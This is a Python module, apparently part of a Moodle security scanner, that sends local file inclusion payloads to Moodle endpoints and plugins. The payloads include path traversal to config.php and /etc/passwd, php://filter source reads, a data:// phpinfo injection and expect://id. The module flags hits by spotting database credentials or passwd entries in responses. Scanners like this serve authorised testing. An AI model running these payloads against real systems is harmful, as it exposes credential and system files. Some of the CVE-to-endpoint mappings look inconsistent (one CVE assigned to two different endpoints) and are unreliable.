#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing Local File Inclusion (LFI) vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
import urllib.parse
from typing import Dict, List, Optional, Any, Union
from bs4 import BeautifulSoup

class MoodleLFITester:
    """Class for testing Local File Inclusion vulnerabilities in Moodle"""
    
    def __init__(
        self, 
        target_url: str, 
        logger: Optional[logging.Logger] = None, 
        timeout: int = 30, 
        proxy: Optional[str] = None, 
        cookies: Optional[Dict[str, str]] = None, 
        delay: float = 0,
        user_agent: Optional[str] = None,
        verify_ssl: bool = True
    ) -> None:
        """Initialize the Moodle LFI tester
        
        Args:
            target_url: Target Moodle URL
            logger: Logger instance
            timeout: Request timeout in seconds
            proxy: Proxy URL
            cookies: Dictionary of cookies
            delay: Delay between requests in seconds
            user_agent: User agent string to use
            verify_ssl: Whether to verify SSL certificates
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies or {}
        self.delay = delay
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl
        self.version_info = None
        
        # Common LFI payloads to test
        self.lfi_payloads = [
            "../config.php",
            "../../config.php",
            "../../../config.php",
            "../../../../config.php",
            "../../../../../config.php",
            "../../../../../../config.php",
            "/etc/passwd",
            "../../../../../../../etc/passwd",
            "C:\\Windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/read=convert.base64-encode/resource=../config.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
            "expect://id",
            "file:///etc/passwd",
            "file://C:/Windows/win.ini"
        ]
        
        # Common parameters that might be vulnerable to LFI
        self.lfi_params = [
            "file", "page", "path", "dir", "download", "include", "read", 
            "content", "document", "folder", "root", "source", "template",
            "theme", "cat", "action", "board", "date", "detail", "location",
            "plugin", "redirect", "type", "view", "show", "id", "name", "class"
        ]
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleLFITester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session with security settings
        self.session = requests.Session()
        
        # Configure the session
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        
        if cookies:
            self.session.cookies.update(cookies)
            
        # Set a secure default user agent if none provided
        if user_agent:
            self.session.headers.update({"User-Agent": user_agent})
        else:
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            })
            
        # Add security-related headers
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        })
    
    def set_version_info(self, version_info):
        """Set version information to guide testing"""
        self.version_info = version_info
    
    def run_tests(self):
        """
        Run all LFI tests
        Returns a dictionary with results information
        """
        self.logger.info("Running Local File Inclusion vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        # Test for LFI vulnerabilities
        lfi_vulns = self.test_lfi_vulnerabilities()
        if lfi_vulns:
            results["vulnerabilities"].extend(lfi_vulns)
        
        # Test for version-specific LFI vulnerabilities
        if self.version_info and self.version_info.get("version"):
            version = self.version_info.get("version")
            version_vulns = self.test_version_specific_lfi(version)
            if version_vulns:
                results["vulnerabilities"].extend(version_vulns)
        
        # Test for path traversal vulnerabilities in plugins
        plugin_vulns = self.test_plugin_lfi_vulnerabilities()
        if plugin_vulns:
            results["vulnerabilities"].extend(plugin_vulns)
        
        self.logger.info(f"LFI vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_lfi_vulnerabilities(self):
        """
        Test for LFI vulnerabilities in common Moodle endpoints
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for LFI vulnerabilities in common Moodle endpoints...")
        
        vulnerabilities = []
        
        # Common endpoints that might be vulnerable to LFI
        potential_targets = [
            "/file.php",
            "/plugin.php",
            "/theme/index.php",
            "/mod/resource/view.php",
            "/mod/folder/view.php",
            "/lib/editor/tiny/plugins/accessibilitychecker/ajax.php",
            "/lib/editor/atto/autosave-ajax.php",
            "/backup/restore.php",
            "/admin/tool/uploadcourse/index.php",
            "/blocks/html/edit_form.php",
            "/repository/repository_ajax.php",
            "/user/files.php"
        ]
        
        # Test each target endpoint with each parameter and payload combination
        for target in potential_targets:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{target}"
            
            try:
                # First check if the page is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code not in [200, 301, 302]:
                    self.logger.debug(f"Skipping {target} - Status: {response.status_code}")
                    continue
                
                # Extract any additional parameters from the page
                additional_params = self._extract_url_params(response.text)
                if additional_params:
                    self.lfi_params.extend(additional_params)
                
                # Test each parameter with each payload
                for param in set(self.lfi_params):
                    for payload in self.lfi_payloads:
                        if self.delay > 0:
                            time.sleep(self.delay)
                        
                        params = {param: payload}
                        
                        try:
                            response = self.session.get(url, params=params, timeout=self.timeout)
                            
                            # Check for signs of successful LFI
                            if self._check_lfi_success(response.text, payload):
                                self.logger.warning(f"Potential LFI vulnerability found on {target} with parameter {param}")
                                
                                vulnerabilities.append({
                                    "title": "Local File Inclusion Vulnerability",
                                    "description": f"The {target} endpoint is vulnerable to LFI via the {param} parameter.",
                                    "severity": "Critical",
                                    "evidence": f"Payload: {payload}\nURL: {url}?{param}={urllib.parse.quote(payload)}",
                                    "payload": payload,
                                    "url": f"{url}?{param}={urllib.parse.quote(payload)}",
                                    "remediation": "Implement proper input validation and use a whitelist approach for file includes."
                                })
                                
                                # No need to test more payloads for this parameter
                                break
                        except Exception as e:
                            self.logger.debug(f"Error testing {url} with parameter {param}: {str(e)}")
            except Exception as e:
                self.logger.debug(f"Error accessing {url}: {str(e)}")
        
        return vulnerabilities
    
    def test_version_specific_lfi(self, version):
        """
        Test for LFI vulnerabilities specific to the detected Moodle version
        Returns a list of found vulnerabilities
        """
        self.logger.info(f"Testing for version-specific LFI vulnerabilities in Moodle {version}...")
        
        vulnerabilities = []
        
        # Check for specific known LFI vulnerabilities based on version
        known_vulnerabilities = {
            # Format: 'version pattern': [{'endpoint': '/path', 'param': 'param_name', 'payload': 'lfi_payload', 'cve': 'CVE-ID'}]
            "3.9": [
                {
                    "endpoint": "/lib/editor/tiny/plugins/accessibilitychecker/ajax.php",
                    "param": "sesskey",
                    "payload": "../../../../../config.php",
                    "cve": "CVE-2021-32478"
                }
            ],
            "3.10": [
                {
                    "endpoint": "/filter/multilang/filter.php",
                    "param": "filter",
                    "payload": "../../config.php",
                    "cve": "CVE-2021-36393"
                }
            ],
            "3.11": [
                {
                    "endpoint": "/admin/tool/lp/uploadfile.php",
                    "param": "component",
                    "payload": "../../../config.php",
                    "cve": "CVE-2022-0326"
                }
            ],
            "4.0": [
                {
                    "endpoint": "/webservice/upload.php",
                    "param": "token",
                    "payload": "../../../../../config.php",
                    "cve": "CVE-2022-0326"
                }
            ]
        }
        
        # Find matching vulnerabilities for the detected version
        for ver_pattern, vulns in known_vulnerabilities.items():
            if version.startswith(ver_pattern):
                self.logger.info(f"Found potential LFI vulnerabilities for Moodle {ver_pattern}")
                
                for vuln in vulns:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    url = f"{self.target_url}{vuln['endpoint']}"
                    params = {vuln['param']: vuln['payload']}
                    
                    try:
                        response = self.session.get(url, params=params, timeout=self.timeout)
                        
                        # Check for signs of successful LFI
                        if self._check_lfi_success(response.text, vuln['payload']):
                            self.logger.warning(f"Potential version-specific LFI found on {vuln['endpoint']} (CVE: {vuln['cve']})")
                            
                            vulnerabilities.append({
                                "title": f"LFI Vulnerability (CVE: {vuln['cve']})",
                                "description": f"The {vuln['endpoint']} endpoint is vulnerable to LFI via the {vuln['param']} parameter.",
                                "severity": "Critical",
                                "evidence": f"Payload: {vuln['payload']}\nURL: {url}?{vuln['param']}={urllib.parse.quote(vuln['payload'])}",
                                "payload": vuln['payload'],
                                "url": f"{url}?{vuln['param']}={urllib.parse.quote(vuln['payload'])}",
                                "cve": vuln['cve'],
                                "remediation": "Update to the latest Moodle version or apply the security patch."
                            })
                    except Exception as e:
                        self.logger.debug(f"Error testing version-specific LFI on {vuln['endpoint']}: {str(e)}")
        
        return vulnerabilities
    
    def test_plugin_lfi_vulnerabilities(self):
        """
        Test for LFI vulnerabilities in Moodle plugins
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for LFI vulnerabilities in Moodle plugins...")
        
        vulnerabilities = []
        
        # Common plugin endpoints that might be vulnerable to LFI
        potential_targets = [
            "/mod/",
            "/blocks/",
            "/local/",
            "/admin/tool/",
            "/repository/",
            "/auth/",
            "/filter/"
        ]
        
        # First, get a list of installed plugins by checking the plugin directories
        installed_plugins = []
        for plugin_dir in potential_targets:
            plugin_list_url = f"{self.target_url}{plugin_dir}"
            try:
                response = self.session.get(plugin_list_url, timeout=self.timeout)
                
                if response.status_code == 200:
                    # Look for plugin directories in links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for link in soup.find_all('a'):
                        href = link.get('href', '')
                        if plugin_dir in href and '?' not in href:
                            plugin_path = href.split(plugin_dir)[1].split('/')[0]
                            if plugin_path and plugin_path not in ['admin', 'index.php', 'lib', 'pluginfile.php']:
                                installed_plugins.append(f"{plugin_dir}{plugin_path}")
            except Exception as e:
                self.logger.debug(f"Error listing plugins in {plugin_dir}: {str(e)}")
        
        # If we found plugins, test them for LFI vulnerabilities
        if installed_plugins:
            self.logger.debug(f"Found {len(installed_plugins)} potential plugin directories to test")
            
            for plugin_path in installed_plugins:
                # Common plugin files that might be vulnerable to LFI
                plugin_files = [
                    "/index.php",
                    "/view.php",
                    "/lib.php",
                    "/settings.php",
                    "/config.php",
                    "/admin.php",
                    "/edit.php",
                    "/ajax.php",
                    "/file.php"
                ]
                
                for plugin_file in plugin_files:
                    plugin_url = f"{self.target_url}{plugin_path}{plugin_file}"
                    
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    try:
                        # First check if the file exists
                        response = self.session.get(plugin_url, timeout=self.timeout)
                        
                        if response.status_code != 200:
                            continue
                        
                        # Test each parameter with a sample of payloads (to reduce test volume)
                        for param in self.lfi_params[:5]:  # Limit to first 5 params to reduce test volume
                            if self.delay > 0:
                                time.sleep(self.delay)
                            
                            # Use a subset of payloads to reduce test volume
                            test_payloads = [
                                "../config.php",
                                "../../config.php",
                                "../../../config.php",
                                "php://filter/convert.base64-encode/resource=../config.php"
                            ]
                            
                            for payload in test_payloads:
                                if self.delay > 0:
                                    time.sleep(self.delay)
                                
                                params = {param: payload}
                                
                                try:
                                    response = self.session.get(plugin_url, params=params, timeout=self.timeout)
                                    
                                    # Check for signs of successful LFI
                                    if self._check_lfi_success(response.text, payload):
                                        self.logger.warning(f"Potential LFI vulnerability found in plugin at {plugin_path}{plugin_file} with parameter {param}")
                                        
                                        vulnerabilities.append({
                                            "title": "Plugin Local File Inclusion Vulnerability",
                                            "description": f"The {plugin_path}{plugin_file} endpoint is vulnerable to LFI via the {param} parameter.",
                                            "severity": "Critical",
                                            "evidence": f"Payload: {payload}\nURL: {plugin_url}?{param}={urllib.parse.quote(payload)}",
                                            "payload": payload,
                                            "url": f"{plugin_url}?{param}={urllib.parse.quote(payload)}",
                                            "remediation": "Update the plugin to the latest version or implement proper input validation."
                                        })
                                        
                                        # No need to test more payloads for this parameter
                                        break
                                except Exception as e:
                                    self.logger.debug(f"Error testing {plugin_url} with parameter {param}: {str(e)}")
                    except Exception as e:
                        self.logger.debug(f"Error accessing {plugin_url}: {str(e)}")
        
        return vulnerabilities
    
    def _extract_url_params(self, html_content):
        """Extract URL parameters from links and forms in the HTML content"""
        params = []
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Extract parameters from links
            for link in soup.find_all('a'):
                href = link.get('href', '')
                if '?' in href:
                    query_part = href.split('?')[1]
                    for param_pair in query_part.split('&'):
                        if '=' in param_pair:
                            param_name = param_pair.split('=')[0]
                            if param_name and param_name not in params:
                                params.append(param_name)
            
            # Extract parameters from forms
            for form in soup.find_all('form'):
                for input_elem in form.find_all(['input', 'select', 'textarea']):
                    if input_elem.has_attr('name'):
                        param_name = input_elem['name']
                        if param_name and param_name not in params:
                            params.append(param_name)
        except Exception as e:
            self.logger.debug(f"Error extracting URL parameters: {str(e)}")
        
        return params
    
    def _check_lfi_success(self, response_text, payload):
        """
        Check if the LFI attempt was successful by looking for common indicators
        Returns True if LFI seems successful, False otherwise
        """
        # If payload was for /etc/passwd, look for root:x:0:0
        if '/etc/passwd' in payload and 'root:x:0:0' in response_text:
            return True
        
        # If payload was for Windows/win.ini, look for specific Windows content
        if 'win.ini' in payload and ('[fonts]' in response_text or '[extensions]' in response_text):
            return True
        
        # If payload was for config.php, look for Moodle database configuration
        if 'config.php' in payload:
            # Look for PHP code indicators
            if '<?php' in response_text or '$CFG' in response_text:
                return True
            
            # Look for database connection strings
            db_patterns = [
                r'dbtype.*=>.*\'mysql\'',
                r'dbhost.*=>.*\'localhost\'',
                r'dbname.*=>.*\'moodle\'',
                r'dbuser.*=>.*\'',
                r'dbpass.*=>.*\''
            ]
            
            for pattern in db_patterns:
                if re.search(pattern, response_text):
                    return True
            
            # Look for base64 encoded content that might be PHP
            if 'PD9waHA' in response_text:  # base64 encoding of <?php
                return True
        
        # If payload used php://filter, look for base64 encoded content
        if 'php://filter' in payload and 'base64-encode' in payload:
            # base64 encoded content tends to be long and contain specific characters
            # Look for substantial base64 content
            base64_pattern = r'[A-Za-z0-9+/=]{100,}'
            if re.search(base64_pattern, response_text):
                return True
        
        # If payload used data:// URIs and we see PHP output like phpinfo, that's a success
        if 'data://' in payload and 'phpinfo' in payload:
            phpinfo_patterns = [
                'PHP Version',
                'PHP License',
                'PHP Configuration',
                'System',
                'Configure Command',
                'Server API'
            ]
            
            matches = 0
            for pattern in phpinfo_patterns:
                if pattern in response_text:
                    matches += 1
            
            # If we match most of the phpinfo patterns, it's likely successful
            if matches >= 3:
                return True
        
        # Check for common error messages that might indicate partial success
        error_patterns = [
            r'failed to open stream',
            r'cannot find',
            r'no such file',
            r'failed to include',
            r'Permission denied',
            r'open_basedir restriction in effect'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Error messages can be false positives, but if coupled with the name of our payload, 
                # it suggests the LFI was processed but failed for other reasons
                if re.search(re.escape(payload), response_text, re.IGNORECASE):
                    return True
        
        return False 